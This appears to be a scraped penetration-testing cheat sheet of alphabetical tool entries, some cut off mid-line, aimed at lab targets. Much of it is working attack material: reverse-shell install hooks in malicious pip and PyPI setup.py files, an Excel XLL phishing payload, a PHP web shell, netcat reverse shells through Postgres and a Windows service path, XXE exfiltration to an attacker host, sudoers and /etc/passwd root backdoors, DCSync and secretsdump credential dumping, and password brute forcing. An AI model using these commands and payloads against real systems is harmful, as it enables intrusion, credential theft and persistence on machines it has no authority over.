item.description: Show TLS Certificate echo | openssl s_client -showcerts -servername 10.10.11.10 -connect 10.10.11.10:443 2>/dev/null | openssl x509 -inform pem -noout -text Base64 Encode/Decode # base64 encode a file openssl base64 -in ./file # base64 decode a file and output to a file cat b64_file | openssl enc -d -base64 -out ./file Certificate Create Client Certificate # Generate a user key openssl genrsa -out username.key 2048 # Create a CSR openssl req -new -key username.

item.title: openvpn
item.description: Connect to vpn sudo openvpn my_vpn.ovpn

item.title: Oracle Database
item.description: Tools sqlplus # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V ODAT (Oracle Database Attacking Tool) Download ODAT # Install sudo apt install odat # Check odat --version Enum # SID enum (You only need one) odat sidguesser -s 10.10.11.10 # User/Password brute force odat passwordguesser -s 10.10.11.10 -d SID --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s 10.

item.title: Padding Oracle
item.description: padbuster Download padbuster # 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 -plaintext user=admin

item.title: Password Cracking
item.description: john Convert file to john hash format # For example ssh2john id_rsa_encrypted > hash keepass2john test.kdbx > hash zip2john test.zip > hash # Get a full list of *2john find / -name *2john 2>/dev/null Basic # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 hashcat Example Hashes

item.title: Phishing
item.description: Phishing with XLL (Excel) revshells.com shell.c #include <windows.h> __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } Compile shell.c using Linux x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32 Send email with the malicious xll file swaks --to "victim@victim.

item.title: PHP Command Shell
item.description: PHP Command Shell <?php system($_REQUEST['cmd']); ?>

item.title: pip
item.description: SUDO 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(("10.10.14.10",1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call(["/bin/sh", "-i"]) setup( cmdclass={ "install": Exploit } ) 2. Exploit # Run sudo pip install .

item.title: POP3
item.description: POP3 # Connect to POP3 mail server telnet 10.10.11.10 110 # Send cmd after +OK USER user PASS password # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit

item.title: Port Knocking
item.description: knockd # Find knock sequence cat /etc/knockd.conf # For example, sequence = 123, 456, 789 for i in 123 456 789; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.11.10 >/dev/null; done; ssh -i id_rsa user@10.10.11.10 # UDP port knocking for i in 123 456 789; do sudo nmap -Pn -sU --host-timeout 100 --max-retries 0 -p $i 10.10.11.10 >/dev/null; done; ssh -i id_rsa user@10.10.11.10

item.title: Postgresql
item.description: General Connect to postgresql Database psql -h 127.0.0.1 -U user -p 5432 -d database Basic Commands # Show databases \list # Show tables in current database \dt # Dump data from table select * from table_name; # Insert data into table (e.g) insert into table_name (username, password, role) values ('user', 'password', 'admin'); # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash 10.

item.title: Pypi
item.description: Abuse Remote Pypi Server 1. Create files mkdir evil_package mkdir evil_package/evil_package cd evil_package touch README.md touch evil_package/__init__.py touch setup.cfg touch setup.py 2. Replace setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(("10.10.14.10",1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call(["/bin/sh", "-i"]) setup(name="evil_package", version="1.0.0", description="Evil Package", author="user", author_email="user@example.com", url="http://example.com", license="MIT", zip_safe=False, cmdclass={"install": Exploit}) 3.

item.title: Python Decompile
item.description: uncompyle6 # Install pip3 install uncompyle6 # Run (need .pyc extension) uncompyle6 script.pyc

item.title: rbash
item.description: rbash Escape # Before enter rbash echo $PATH # Enter rbash su user - # rbash escape using tar tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash # Paste the above $PATH (e.g.) export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

item.title: Redis
RPC
item.description: RPC rpcclient # Connect without creds rpcclient -U '' -N 10.10.11.10 # Connect with creds rpcclient -U domain/username%password 10.10.11.10 # Inline execute command rpcclient -U domain/username%password 10.10.11.10 -c 'querydispinfo' Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup RID # Query group member by rid querygroupmem RID # Query user by rid queryuser RID # Look up a user lookupnames USERNAME # Look up by SID lookupsids SID impacket-lookupsid impacket-lookupsid username:password@10.

item.title: rsync
item.description: Basic Commands # List directory ('/') rsync --list-only -a rsync://10.10.11.10/ # List directory ('/') with ipv6 rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/ # List a file rsync --list-only -a rsync://10.10.11.10/etc/passwd # List files (wildcard) rsync --list-only -a rsync://10.10.11.10/etc/rsync* # Get a file rsync -a rsync://10.10.11.10/etc/passwd . # Get files (wildcard) rsync -a rsync://10.10.11.10/etc/rsync* . # Copy files recusively to remote (With Creds) export RSYNC_PASSWORD=password; rsync -aR .ssh/ rsync://user@10.10.11.10/home_user/ Bruteforce rsync password # Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.

item.title: Runas
item.description: Runas (with creds) Create Cred Object $username = "domain\username" $password = "password" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Run Commnad Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost # If error, try Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost -auth credssp Create a new PS session new-pssession -computername . -credential $cred # Switch to new session enter-pssession 1 Runas (with cache creds) Check cache creds cmdkey /list Run Command # e.

item.title: Searchsploit
item.description: searchsploit # Search service with specific version # For example: samba 3.0 searchsploit samba 3.0 # Read the exploit searchsploit -x unix/remote/16320.rb # Copy the exploit searchsploit -m unix/remote/16320.rb

item.title: SeBackupPrivilege/SeRestorePrivilege
item.description:
robocopy # For example robocopy /b <target_dir_path> C:\Windows\Tasks <target_file> Helper dlls SeBackupPrivilegeUtils.dll SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege <target_file_path> C:\Windows\Tasks\<target_file> # For example Copy-FileSeBackupPrivilege C:\Windows
tds
tds.dit C:\Windows\Tasks
tds.dit diskshadow Create a .dsh file set context persistent nowriters set metadata C:\Windows\Tasks	est.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh Run vss.dsh # Upload and run diskshadow /s C:\Windows\Tasks\vss.dsh Host a smb server (In Linux) impacket-smbserver share .

item.title: secretsdump
item.description: Impacket Download Impacket secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10

item.title: Secure String
item.description: Decrypt secure string $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist "administrator", $ss $cred.GetNetworkCredential().password

item.title: SeLoadDriverPrivilege
item.description: SeLoadDriverPrivilege Compile eoploaddriver eoploaddriver.cpp 1. Open Visual Studio 2022 2. Create a new project 3. Project Template : C++ Console App 4. Project Name : Eoploaddriver 5. Replace code : eoploaddriver.cpp 6. Remove header : `include "stdafx.h"` 7. Release -> x64 8. Build -> Build Solution 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.exe Download Capcom.sys Capcom.sys Compile ExploitCapcom ExploitCapcom 1. Double click ExploitCapcom.sln 2. Replace the payload to `TCHAR CommandLine[] = TEXT("C:\\Windows\\Tasks\\rev.exe");` 3.

item.title: Server Operators
item.description: Server Operators # Change a service path (e.g. browser) sc.exe config browser binPath= "C:\windows\tasks\nc.exe -e cmd.exe 10.10.14.10 443" # Stop service sc.exe stop browser # Start service sc.exe stop browser

item.title: Shadow Hash Cracking
item.description: Shadow Hash Cracking # Prepare an unshadowed hashes file unshadow passwd.txt shadow.txt > unshadowed.txt john john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt hashcat hashcat -m 7400 unshadowed.txt /usr/share/wordlists/rockyou.txt --force --user

item.title: SMB Enum
item.description: SMB Share Enum nmap script sudo nmap --script=smb-enum-shares -p 445 10.10.11.10 Login without password smbmap smbmap -H 10.10.11.10 --no-banner smbmap -H 10.10.11.10 -u null --no-banner # List known share smbmap -H 10.10.11.10 -r 'share' smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\10.10.11.10\\ --option='client min protocol=NT1' Login with password smbmap smbmap -H 10.

item.title: SMTP
item.description: SMTP Simple Debugging Server #!/usr/bin/env python3 import aiosmtpd.controller class CustomSMTPHandler: async def handle_DATA(self, server, session, envelope): print(f"[+] Received a mail.") print("=" * 50) print(envelope.content.decode()) print("=" * 50) return "250 OK" handler = CustomSMTPHandler() server = aiosmtpd.controller.Controller(handler, hostname="0.0.0.0", port=25) server.start() print("[*] Listening on 0.0.0.0:25") input("[*] Server started. Press Return to quit.\n") server.stop() User Enum perl smtp-user-enum.pl -M RCPT -U users.txt -t 10.10.11.10 Note: smtp-user-enum.pl

item.title: SNMP
item.description: onesixtyone Download onesixtyone # Brute force community string for snmpwalk use onesixtyone 10.10.11.10 -c /usr/share/doc/onesixtyone/dict.txt snmpwalk Installation sudo apt install snmp # Install Add-on for better result readability sudo apt install snmp-mibs-downloader # Comment out this line in /etc/snmp/snmp.conf # mibs : # Uncomment this line in /etc/snmp/snmp.conf mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf Basic Commands snmpwalk -v2c -c public 10.10.11.10 | tee snmpwalk_result # Query specific OID, e.g, ipAddressIfIndex.ipv6 snmpwalk -v2c -c public 10.

item.title: SQL Injection
item.description: sqlmap Download sqlmap # In Burp Suite, we can right click the request and click `copy to file` to save the request # And add `*` to request to indicate the sql injection point # Initial testing HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # Initial testing HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # Add a string to indicate injection succeed (e.

item.title: Squid Proxy
item.description: Config location /etc/squid/squid.conf Connect via FoxyProxy Firefox plugin +------------------------+ |Settings | +------------------------+ |Title : squid proxy| |Proxy Type : HTTP | |Proxy IP : 10.10.11.10| |Port : 3128 | |Username : (If any) | |Password : (If any) | +------------------------+ # Connect http://10.10.11.10 http://127.0.0.1 Internal ports scan via proxy # 1. Take note of word size, then Ctrl+C wfuzz -z range,1-1000 -p 10.10.11.10:3128:HTTP -u http://127.0.0.1:FUZZ # 2. Re-run with word size filter wfuzz -z range,1-65535 -p 10.

item.title: SSH
item.description: Check SSH version openssh-server (ubuntu) openssh-server (debian) Config Location /etc/ssh/sshd_config # Grep contents grep -Ev "^#" /etc/ssh/sshd_config | grep . Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Check Public Key ssh-keygen -l -f id_rsa Generate no passphrase SSH key from encrypted key openssl rsa -in id_rsa_encrypted -out ./id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo '<id_rsa.

item.title: SSL
item.description: sslscan # Scan target SSL version sslscan 10.10.11.10 Fix Old ssl Protocol Connection Problem # Edit /etc/ssl/openssl.cnf [system_default_sect] #MinProtocol = DEFAULT@SECLEVEL=2 MinProtocol = None #CipherString = DEFAULT@SECLEVEL=2 CipherString = None Note: Remember to revert the changes after job done

item.title: Steganography
item.description: exiftool exiftool test.jpg steg steghide # Always try with empty passphrase steghide extract -sf test.jpg

item.title: Subdomain Enum
item.description: wfuzz download wfuzz # HTTP wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.example.com" -u http://example.com # HTTPS wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.example.com" -u https://example.com -k Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.example.com" -u http://example.com --hw 10 gobuster gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://example.com Add domain/subdomain to /etc/hosts echo "10.10.11.10 example.com" | sudo tee -a /etc/hosts

item.title: sudoers
item.description: Privesc Abuse /etc/sudoers # IF you have control over `/etc/sudoers` chmod 600 /etc/sudoers echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers chmod 440 /etc/sudoers

item.title: TFTP
item.description: TFTP # Connect tftp 10.10.11.10 # Download get file # Exit quit Note: You need to know the exact filename, there is no directory listing in tftp

item.title: Upgrade Shell
item.description: Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c 'import pty; pty.spawn("/bin/bash")' # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color socat Download socat # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.

item.title: VNC
item.description: Basic # Connect vncviewer 127.0.0.1:5901 -passwd secret Note: secret is a cookie binary file

item.title: VPN
item.description: Enum # Check with ikeV1 ike-scan -M 10.10.11.10 # Check with ikeV2 ike-scan -M --ikev2 10.10.10.116 Connect to VPN Tools sudo apt install strongswan Settings # Edit /etc/ipsec.secrets %any : PSK "password" # Edit /etc/ipsec.conf (copy from ike-scan result) config setup charondebug="all" uniqueids=yes strictcrlpolicy=no conn testvpn authby=secret auto=add ike=3des-sha1-modp1024! esp=3des-sha1! type=transport keyexchange=ikev1 left=10.10.14.10 right=10.10.11.10 rightsubnet=10.10.11.10[tcp] Connect # Reset ipsec restart # Connect ipsec up testvpn

item.title: Web Directory Enum
item.description: feroxbuster HTTP feroxbuster -u http://example.com/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt HTTPS feroxbuster -u https://example.com/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Specify Extension feroxbuster -u http://example.com/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx Add trailing slash / to each request feroxbuster -u http://example.com/ -f --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt wfuzz Fuzzing Number Range wfuzz -z range,1-99 http://example.com/users/FUZZ gobuster gobuster dir -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 40 -x php BFAC (Backup File Artifacts Checker) Download BFAC

item.title: Webdav
item.description: davtest Download davtest # Without creds davtest -url http://10.10.11.10 # With creds davtest -url http://10.10.11.10 -auth user:password curl # Rename a remote file curl -X MOVE -H 'Destination:http://example.com/test.php' http://example.com/test.txt

item.title: whois
item.description: WHOIS # General whois google.com # With specific server whois -h 10.10.11.10 -p 43 google.com

item.title: Windows ACLs
item.description: Window ACLs (Access Control Lists) Check ACLs # Check a file/directory icacls "C:\Users\User" # Check all files and directories icacls * /C Grant user full control icacls file_name /grant user:F +-------------------------------------------------+ |F (full access) | |M (modify access) | |RX (read and execute access) | |R (read-only access) | |W (write-only access) | |D (delete) | |RC (read control) | |WDAC (write DAC) | |WO (write owner) | |S (synchronize) | |AS (access system security) | |MA (maximum allowed) | |GR (generic read) | |GW (generic write) | |GE (generic execute) | |GA (generic all) | |RD (read data/list directory) | |WD (write data/add file) | |AD (append data/add subdirectory) | |REA (read extended attributes) | |WEA (write extended attributes) | |X (execute/traverse) | |DC (delete child) | |RA (read attributes) | |WA (write attributes) | |OI (object inherit) | |CI (container inherit) | |IO (inherit only) | |NP (do not propagate inherit) | |I (permission inherited from parent container)| +-------------------------------------------------+

item.title: Wordpress
item.description: wpscan Get Free API key # HTTP wpscan --url http://example.com -e ap,t,tt,u # HTTPS wpscan --url http://example.com -e ap,t,tt,u --disable-tls-checks # You will need an api token to scan vulns wpscan --url http://example.com -e ap,t,tt,u --api-token API_KEY # Brute force wp-admin wpscan --url http://example.com --passwords passwords.txt --usernames admin

item.title: Writable /etc/passwd
item.description: Writable /etc/passwd # Check ls -l /etc/passwd /etc/shadow # Create password hash openssl passwd -1 password # Add to /etc/passwd echo 'user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash' >> /etc/passwd # Get root shell su - user

item.title: WriteDacl
item.description: Add dcsync right to user . .\PowerView.ps1 Authenticated Add-DomainObjectAcl -PrincipalIdentity 'USER' -TargetIdentity 'EXAMPLE.COM\Domain Admins' -Rights DCSync Runas $username = "domain\username" $password = "password" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Add-DomainObjectAcl -PrincipalIdentity 'USER' -TargetIdentity 'EXAMPLE.COM\Domain Admins' -Rights DCSync -Credential $Cred Dcsync attack impacket-secretsdump username:password@10.10.11.10

item.title: XXE (XML External Entity)
item.description: XXE Template <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ENTITY data SYSTEM "/etc/passwd">]> <product> <id>&data;</id> <price></price> </product> External DTD (2 stage) <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://10.10.14.10/data?%data;'>"> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY % bar SYSTEM "http://10.10.14.10/evil.dtd"> %bar; %eval; ]> <product> <id>&exfil;</id> <price></price> </product>

item.title: Zabbix
item.description: Zabbix API General # Auth with cred curl http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.login", "id":1, "auth":null, "params":{"user": "user", "password": "password"}}' # Get users curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.get", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{"output": "extend"}}' | jq . # Get hosts curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"host.get", "id":1, "auth":"abcdefgh1234567890ijklmnopqrstuv", "params":{}}' | jq . # Get user group info curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.
